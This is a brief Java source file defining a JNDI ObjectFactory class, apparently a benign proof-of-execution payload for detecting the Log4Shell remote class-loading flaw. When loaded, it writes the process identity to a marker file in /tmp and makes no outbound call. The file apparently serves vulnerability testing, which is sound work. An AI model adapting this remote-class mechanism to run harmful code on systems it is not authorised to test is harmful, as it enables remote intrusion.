import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.lang.management.ManagementFactory;
import java.util.Hashtable;
import javax.naming.*;

/** Benign remote-class oracle: writes only a controlled process identity marker. */
public final class NativeFactory implements javax.naming.spi.ObjectFactory {
  public Object getObjectInstance(Object object, Name name, Context context, Hashtable<?, ?> environment) throws Exception {
    String proof = "native-remote-class:" + ManagementFactory.getRuntimeMXBean().getName() + "\n";
    Files.write(Paths.get("/tmp/module-target-log4shell-native-class"), proof.getBytes(StandardCharsets.UTF_8));
    return "native-remote-class-proof";
  }
}
